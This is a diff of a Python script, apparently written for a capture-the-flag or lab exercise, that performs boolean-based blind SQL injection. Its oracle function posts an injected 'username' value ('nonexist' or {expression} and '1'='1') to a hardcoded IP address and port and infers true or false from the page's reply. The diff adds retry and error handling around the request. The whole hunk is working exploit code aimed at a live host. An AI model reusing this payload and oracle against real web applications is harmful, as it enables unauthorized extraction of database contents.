@@ -16,15 +16,19 @@ def oracle(expression):
         return True
     elif (MODE == "boolean-based"):
         while(True):
-            payload = quote(f"nonexist' or {expression} and '1'='1")
-            data=f'username={payload}&message=test'
-            response = requests.post("http://154.57.164.82:31912/index.php", data=data,headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=(3.0, 10.0))
-            if ('Message successfully sent!' in response.text):
-                return True
-            elif ('User does not exist!' in response.text):
-                return False
-            else:
-                print(f'[ERROR] Timed out or unknown response! Retry...')
+            try:
+                payload = quote(f"nonexist' or {expression} and '1'='1")
+                data=f'username={payload}&message=test'
+                response = requests.post("http://154.57.164.82:31912/index.php", data=data,headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=(3.0, 10.0))
+                if ('Message successfully sent!' in response.text):
+                    return True
+                elif ('User does not exist!' in response.text):
+                    return False
+                else:
+                    print(f'[ERROR] Unknown response!')
+                    sys.exit()
+            except:
+                print(f'[ERROR] Network error. Retrying...')
     else:
         sys.exit()
 
